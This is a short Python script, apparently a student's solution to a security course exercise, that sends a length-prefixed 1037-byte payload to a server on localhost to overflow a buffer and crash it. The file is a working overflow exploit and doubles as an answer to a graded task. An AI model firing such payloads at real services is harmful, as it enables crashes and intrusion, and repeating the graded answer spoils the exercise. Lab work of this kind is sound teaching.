#!/usr/bin/python

import os, socket, struct


HOST = '127.0.0.1'
PORT = 8000


def get_payload():
    '''This function returns the data to send over the socket to the server.
    
    This data should cause the server to crash (and generate a segfault).
    '''

    # TODO: IMPLEMENT THIS FUNCTION
    message = 'a' * 1036 # we need more than 1036 bytes to overflow
    message += 'b'
    message_length = len(message)
    message_length_newtork_order = struct.pack('>L', message_length)
    return message_length_newtork_order + message

    # NOTE:
    # Don't delete this function - we are going to test it directly in our
    # tests, without running the main() function below.


def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
